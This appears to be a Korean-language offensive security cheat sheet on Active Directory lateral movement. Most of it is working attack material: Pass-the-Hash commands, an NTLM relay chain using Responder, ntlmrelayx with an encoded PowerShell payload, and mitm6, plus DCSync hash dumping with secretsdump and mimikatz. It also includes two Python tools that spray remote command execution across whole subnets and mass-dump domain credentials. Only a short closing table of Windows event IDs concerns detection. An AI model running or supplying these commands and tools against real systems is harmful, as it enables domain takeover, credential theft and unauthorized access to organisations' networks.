# AD 횡이동 — NTLM 릴레이·DCSync·PsExec·원격 실행

## 1. 횡이동 기법 개요

| 기법 | 도구 | 필요 권한 |
|------|------|-----------|
| PsExec | psexec.py / Sysinternals | 로컬 관리자 |
| WMI | wmiexec.py | 로컬 관리자 |
| WinRM | evil-winrm | WinRM 접근 |
| DCOM | dcomexec.py | 로컬 관리자 |
| Pass-the-Hash | pth-winexe | 로컬 관리자 해시 |
| Pass-the-Ticket | Rubeus / ticketer.py | 유효한 티켓 |
| NTLM Relay | ntlmrelayx.py | 네트워크 위치 |
| DCSync | secretsdump.py | DS-Replication 권한 |

---

## 2. Pass-the-Hash (PtH)

```bash
# Impacket psexec — NTLM 해시로 원격 실행
python3 psexec.py -hashes :NTLM_HASH domain/administrator@10.10.10.100

# wmiexec — WMI 기반 (덜 시끄러움)
python3 wmiexec.py -hashes :NTLM_HASH domain/admin@10.10.10.100

# smbexec — 반대로 탐지 어려움
python3 smbexec.py -hashes :NTLM_HASH domain/admin@10.10.10.100

# evil-winrm (WinRM 5985)
evil-winrm -i 10.10.10.100 -u administrator -H NTLM_HASH

# xfreerdp (RDP PtH)
xfreerdp /v:10.10.10.100 /u:administrator /pth:NTLM_HASH /d:domain

# CrackMapExec 대량 PtH
netexec smb 10.10.10.0/24 -u administrator -H NTLM_HASH --local-auth
```

---

## 3. NTLM Relay 공격

```bash
# 1단계: SMB 서명 비활성화 호스트 탐지
netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# 2단계: Responder 설정 (SMB/HTTP 리스너 끄기)
# /etc/responder/Responder.conf 수정:
# SMB = Off
# HTTP = Off

# 3단계: ntlmrelayx 실행
python3 ntlmrelayx.py -tf relay_targets.txt -smb2support \
  -c "powershell -enc BASE64_PAYLOAD" -l /tmp/loot

# LDAP 릴레이 → 권한 상승
python3 ntlmrelayx.py -t ldap://DC_IP -smb2support \
  --escalate-user current_user

# LDAPS 릴레이 → Shadow Credentials
python3 ntlmrelayx.py -t ldaps://DC_IP --shadow-credentials \
  --shadow-target target_computer$

# 4단계: Responder로 NTLM 캡처 유발
python3 Responder.py -I eth0 -wf

# IPv6 기반 릴레이 (mitm6)
python3 mitm6.py -d domain.local
python3 ntlmrelayx.py -6 -t ldaps://DC_IP -wh attacker_wpad \
  --add-computer evilpc --delegate-access
```

---

## 4. DCSync 공격

DCSync는 도메인 컨트롤러 복제 권한(`DS-Replication-Get-Changes-All`)을 이용해 패스워드 해시를 원격으로 덤프한다.

```bash
# Impacket secretsdump — DCSync
python3 secretsdump.py -just-dc domain.local/admin:Password@DC_IP

# 특정 계정만 덤프
python3 secretsdump.py -just-dc-user krbtgt domain.local/admin:Password@DC_IP
python3 secretsdump.py -just-dc-user administrator domain.local/admin:Password@DC_IP

# 모든 도메인 시크릿 덤프
python3 secretsdump.py domain.local/admin:Password@DC_IP \
  -just-dc -outputfile dcsync_output

# Mimikatz DCSync (Windows)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# ACL 기반 DCSync 권한 부여 (권한 있을 때)
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
  -PrincipalIdentity attacker_user \
  -Rights DCSync
```

---

## 5. 원격 실행 자동화 CLI

```python
#!/usr/bin/env python3
"""AD 횡이동 자동화 CLI — 다중 호스트 원격 실행."""

import argparse
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from pathlib import Path
from typing import Literal
import ipaddress


@dataclass
class ExecutionResult:
    target: str
    method: str
    success: bool
    output: str
    error: str = ""


def run_wmiexec(
    target: str,
    domain: str,
    username: str,
    credential: str,
    command: str,
    use_hash: bool = False,
) -> ExecutionResult:
    hashes = f":{credential}" if use_hash else ""
    password = "" if use_hash else credential

    cmd = [
        "python3", "-m", "impacket.examples.wmiexec",
        "-hashes", hashes if use_hash else ":",
        f"{domain}/{username}:{password if not use_hash else ''}@{target}",
        command,
    ]
    if not use_hash:
        cmd = [
            "python3", "-m", "impacket.examples.wmiexec",
            f"{domain}/{username}:{credential}@{target}",
            command,
        ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        success = result.returncode == 0
        return ExecutionResult(
            target=target,
            method="wmiexec",
            success=success,
            output=result.stdout[:500],
            error=result.stderr[:200] if not success else "",
        )
    except subprocess.TimeoutExpired:
        return ExecutionResult(target=target, method="wmiexec", success=False, output="", error="타임아웃")
    except Exception as e:
        return ExecutionResult(target=target, method="wmiexec", success=False, output="", error=str(e))


def spray_credentials(
    targets: list[str],
    domain: str,
    username: str,
    credential: str,
    command: str,
    use_hash: bool = False,
    max_workers: int = 10,
) -> list[ExecutionResult]:
    results: list[ExecutionResult] = []

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(run_wmiexec, t, domain, username, credential, command, use_hash): t
            for t in targets
        }
        for future in as_completed(futures):
            target = futures[future]
            result = future.result()
            if result.success:
                print(f"[+] {target}: 성공")
                print(f"    {result.output[:200]}")
            else:
                print(f"[-] {target}: 실패 ({result.error[:100]})")
            results.append(result)

    return results


def expand_cidr(cidr: str) -> list[str]:
    """CIDR 표기를 IP 목록으로 변환."""
    network = ipaddress.ip_network(cidr, strict=False)
    return [str(ip) for ip in network.hosts()]


def main() -> None:
    parser = argparse.ArgumentParser(description="AD 횡이동 자동화")
    sub = parser.add_subparsers(dest="cmd", required=True)

    spray_p = sub.add_parser("spray", help="다중 호스트 명령 실행")
    spray_p.add_argument("targets", help="대상 IP/CIDR 또는 파일 경로")
    spray_p.add_argument("domain")
    spray_p.add_argument("-u", "--user", required=True)
    spray_p.add_argument("-p", "--password", help="패스워드")
    spray_p.add_argument("-H", "--hash", help="NTLM 해시")
    spray_p.add_argument("-c", "--command", required=True)
    spray_p.add_argument("--workers", type=int, default=10)
    spray_p.add_argument("-o", "--output", type=Path)

    args = parser.parse_args()

    if args.cmd == "spray":
        # 대상 목록 준비
        target_input = args.targets
        if Path(target_input).exists():
            targets = Path(target_input).read_text().splitlines()
        elif "/" in target_input:
            targets = expand_cidr(target_input)
        else:
            targets = [target_input]

        if not (args.password or args.hash):
            parser.error("패스워드(-p) 또는 해시(-H) 필요")

        credential = args.hash or args.password
        use_hash = bool(args.hash)

        print(f"[*] {len(targets)}개 호스트 대상 명령 실행 시작")
        results = spray_credentials(
            targets, args.domain, args.user, credential,
            args.command, use_hash, args.workers,
        )

        success_count = sum(1 for r in results if r.success)
        print(f"\n총 {len(results)}개 / 성공 {success_count}개")

        if args.output:
            import json
            args.output.write_text(
                json.dumps([vars(r) for r in results], indent=2, ensure_ascii=False)
            )


if __name__ == "__main__":
    main()
```

---

## 6. 자격증명 덤프 자동화

```python
#!/usr/bin/env python3
"""다중 호스트 자격증명 덤프 자동화."""

import argparse
import subprocess
import re
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field


@dataclass
class CredentialDump:
    target: str
    ntlm_hashes: list[str] = field(default_factory=list)
    cleartext_passwords: list[str] = field(default_factory=list)
    error: str = ""


NTLM_PATTERN = re.compile(r"(\w+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::")
CLEARTEXT_PATTERN = re.compile(r"(\w+):\d+:(.*?):.*?:::")


def dump_secrets(
    target: str,
    domain: str,
    username: str,
    credential: str,
    use_hash: bool = False,
) -> CredentialDump:
    hashes = f":{credential}" if use_hash else ":"
    password = "" if use_hash else credential

    cmd = [
        "python3", "-m", "impacket.examples.secretsdump",
        f"{domain}/{username}:{password}@{target}",
        "-hashes", hashes,
        "-just-dc-ntlm" if not use_hash else "-just-dc",
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        dump = CredentialDump(target=target)

        for line in result.stdout.splitlines():
            m = NTLM_PATTERN.match(line)
            if m:
                dump.ntlm_hashes.append(f"{m.group(1)}:{m.group(3)}:{m.group(4)}")

        return dump
    except Exception as e:
        return CredentialDump(target=target, error=str(e))


def main() -> None:
    parser = argparse.ArgumentParser(description="자격증명 덤프 자동화")
    parser.add_argument("targets", help="대상 파일 또는 IP")
    parser.add_argument("domain")
    parser.add_argument("-u", "--user", required=True)
    parser.add_argument("-p", "--password")
    parser.add_argument("-H", "--hash")
    parser.add_argument("-o", "--output", type=Path, default=Path("/tmp/dumped_creds.txt"))
    args = parser.parse_args()

    targets = (
        Path(args.targets).read_text().splitlines()
        if Path(args.targets).exists()
        else [args.targets]
    )

    credential = args.hash or args.password or ""
    use_hash = bool(args.hash)

    all_hashes: list[str] = []
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {
            executor.submit(dump_secrets, t, args.domain, args.user, credential, use_hash): t
            for t in targets
        }
        for future in as_completed(futures):
            dump = future.result()
            if dump.ntlm_hashes:
                print(f"[+] {dump.target}: {len(dump.ntlm_hashes)}개 해시")
                all_hashes.extend(dump.ntlm_hashes)

    if all_hashes:
        args.output.write_text("\n".join(set(all_hashes)))
        print(f"\n총 {len(set(all_hashes))}개 유니크 해시 → {args.output}")


if __name__ == "__main__":
    main()
```

---

## 7. 탐지 우선순위

| 이벤트 ID | 의미 | 횡이동 관련성 |
|-----------|------|----------------|
| 4624 | 로그온 성공 | Type 3 (네트워크) / Type 10 (원격) |
| 4648 | 명시적 자격증명 로그온 | PtH · PtT |
| 4672 | 특권 로그온 | 관리자 권한 사용 |
| 4688 | 프로세스 생성 | psexec · wmiexec |
| 5145 | 네트워크 공유 접근 | ADMIN$·C$ 접근 |
| 4662 | AD 객체 작업 | DCSync (DS-Replication) |
| 7045 | 서비스 설치 | psexec 서비스 생성 |
